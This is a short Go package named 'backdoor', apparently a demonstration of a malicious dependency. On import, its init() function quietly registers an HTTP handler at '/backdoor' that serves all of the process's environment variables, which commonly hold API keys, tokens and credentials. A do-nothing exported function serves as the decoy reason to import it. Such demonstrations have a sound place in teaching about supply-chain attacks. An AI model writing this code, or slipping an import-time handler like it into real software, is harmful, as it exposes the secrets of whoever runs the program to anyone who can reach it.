package backdoor

import (
	"fmt"
	"net/http"
	"os"
)

func init() {
	// a simple backdoor which just serves up environment variables
	http.HandleFunc("/backdoor", func(w http.ResponseWriter, r *http.Request) {
		for _, e := range os.Environ() {
			fmt.Fprintf(w, "%s", e)
		}
	})
}

// FakeFunctionality provides a function that does nothing, but is as a wonky
// example of why someone might use this code as a depency in the first place.
//
// No code is best code, right?
func FakeFunctionality() {
	return
}
